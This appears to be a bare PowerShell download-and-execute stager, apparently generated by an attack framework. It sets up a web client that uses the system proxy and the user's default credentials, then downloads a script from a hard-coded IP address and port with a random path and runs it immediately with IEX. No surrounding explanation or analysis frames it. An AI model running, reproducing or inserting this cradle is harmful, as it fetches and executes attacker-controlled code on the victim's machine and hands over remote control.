[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
$vYvli=new-object net.webclient;
if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){
    $vYvli.proxy=[Net.WebRequest]::GetSystemWebProxy();
    $vYvli.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
};
IEX ((new-object Net.WebClient).DownloadString('http://100.1.1.131:8080/pakhnAAjLe0wl'));